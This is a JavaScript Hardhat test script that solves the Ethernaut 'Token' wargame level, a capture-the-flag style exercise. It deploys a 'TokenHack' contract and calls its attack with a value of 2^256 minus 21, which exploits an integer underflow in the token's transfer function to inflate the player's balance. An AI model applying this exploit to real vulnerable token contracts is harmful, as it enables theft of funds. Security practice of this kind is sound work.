const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { ethers, waffle } = require("hardhat");
const {
  createChallenge,
  submitLevel,
  ETHERNAUT_ABI,
  ETHERNAUT_ADDRESS,
} = require("./utils");

const abi = [
  {
    inputs: [
      { internalType: "uint256", name: "_initialSupply", type: "uint256" },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [{ internalType: "address", name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "balance", type: "uint256" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x70a08231",
  },
  {
    inputs: [],
    name: "totalSupply",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x18160ddd",
  },
  {
    inputs: [
      { internalType: "address", name: "_to", type: "address" },
      { internalType: "uint256", name: "_value", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xa9059cbb",
  },
];

const contractLevel = "0xf4bc97bB219b0EEAC88C8E00318B45719b5e6A9C";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(contractLevel, 0, "TokenFactory");
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  let playerBalance = await challenge.balanceOf(eoa.address);
  console.log(`playerAddress: ${JSON.stringify(eoa.address)}`);
  console.log(`playerBalance: ${JSON.stringify(playerBalance.toString())}`);
  let ownerBalance = await challenge.balanceOf(
    "0xe5a35680edf93e87222a11fe461b0ada743d6201"
  );
  console.log(`ownerBalance: ${JSON.stringify(ownerBalance.toString())}`);

  let tokenHackFactory = await ethers.getContractFactory("TokenHack");
  let tokenHack = await tokenHackFactory.deploy(challenge.address);
  await tokenHack.deployed();

  let tx = await tokenHack.attack(
    eoa.address,
    ethers.BigNumber.from(2).pow(256).sub(21)
  );
  tx.wait(1);
  playerBalance = await challenge.balanceOf(eoa.address);
  console.log(`playerAddress: ${JSON.stringify(eoa.address)}`);
  console.log(`playerBalance: ${JSON.stringify(playerBalance.toString())}`);
});
//-21: 115792089237316195423570985008687907853269984665640564039457584007913129639935;
after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
